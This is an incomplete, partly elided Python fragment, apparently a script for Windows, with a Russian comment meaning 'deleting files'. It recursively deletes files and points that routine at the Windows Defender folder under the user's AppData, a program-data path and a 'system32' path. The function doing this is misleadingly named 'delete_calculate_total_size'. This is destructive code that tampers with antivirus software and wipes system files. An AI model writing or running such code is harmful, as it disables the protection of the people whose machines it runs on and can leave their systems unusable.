...
def delete_files_in_folder(folder_path):
    ...
    for file in folder.glob('**/*'):
        try:
            ...
            print(f"Permission error: {e} - Skipping file {file}")

def delete_calculate_total_size():
    ...
    appdata_path = f"C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Windows Defender"
    ...
    # Удаление файлов
    delete_files_in_folder(program_data_path)
    delete_files_in_folder(system32_path)
    delete_files_in_folder(appdata_path)
